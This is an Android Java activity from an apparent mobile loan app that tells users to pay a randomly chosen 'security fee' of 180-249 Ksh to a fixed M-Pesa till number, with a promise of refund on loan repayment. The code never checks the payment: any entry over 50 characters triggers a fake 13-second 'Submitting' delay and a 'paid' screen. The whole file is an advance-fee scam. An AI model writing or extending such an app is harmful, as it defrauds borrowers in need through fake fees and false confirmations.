package com.persnickyte.zeriphic;

import android.app.ProgressDialog;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.util.Random;

public class catch_page extends AppCompatActivity {

    TextView catch_message;
    EditText catch_mpesa;
    Button catchfinish, catchcopy;
    String amount;
    SharedPreferences sharedPreferences;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_catch_page);
        AdsManager.LoadInterstitialAd(this);
        AdsManager.LoadBannerAd(this);
        catch_message = findViewById(R.id.catch_message);
        catch_mpesa = findViewById(R.id.catch_mpesa);
        catchfinish = findViewById(R.id.catchfinish);
        catchcopy = findViewById(R.id.catchcopy);

        sharedPreferences = getApplicationContext().getSharedPreferences("user_info", Context.MODE_PRIVATE);
        String lastname = sharedPreferences.getString("last_name", "Customer");
        deposit();

        catch_message.setText("Dear " + lastname + ". We are committed to serving our customers to satisfaction on trust and loyalty.\n\n" +
                "Therefore, Tavan Ventures(Which owns " + getResources().getString(R.string.app_name) + ") requires you to " +
                "save Ksh " + amount + " to TILL NO : 8555634 which will act " +
                "as security fee.\n\n" +
                "You will be refunded upon loan repayment.\n\n" +
                "To avoid delays make sure you enter the correct M-PESA CODE received in the space below.\n\n" +
                "1. Go to M-Pesa\n" +
                "2. Lipa na M-Pesa\n" +
                "3. Buy Goods and services.\n" +
                "4. Enter 8555634\n\n"+
                "Tap the button below to copy TILL Number to clipboard");

        ClipboardManager clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);

        catchcopy.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                clipboardManager.setPrimaryClip(ClipData.newPlainText("TILL", "8555634"));
                Toast.makeText(catch_page.this, "TILL Copied", Toast.LENGTH_SHORT).show();
            }
        });


        catchfinish.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                String mpesamessage = catch_mpesa.getText().toString();
                if (mpesamessage.length() > 50) {

                    SharedPreferences.Editor editor = sharedPreferences.edit();
                    editor.putString("loanprog", "1");
                    editor.commit();

                    final ProgressDialog progressDialog = new ProgressDialog(catch_page.this);
                    progressDialog.setTitle("Please wait, it takes less than a minute");
                    progressDialog.setMessage("Submitting...");
                    progressDialog.setProgressStyle(0);
                    progressDialog.setMax(100);
                    progressDialog.show();
                    progressDialog.setCancelable(false);
                    new Thread(new Runnable() {
                        public void run() {
                            try {
                                Thread.sleep(13000);
                                Intent intent = new Intent(catch_page.this, paid.class);
                                catch_page.this.startActivity(intent);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            progressDialog.dismiss();
                        }
                    }).start();
                    return;
                }
                Toast.makeText(catch_page.this, "Enter a valid M-Pesa message", Toast.LENGTH_SHORT).show();
                catch_mpesa.setError("Invalid M-Pesa message!");
            }
        });
    }
    private void deposit(){
        Random random = new Random();
        int val = random.nextInt(250-180)+180;
        amount = String.valueOf(val);
    }
}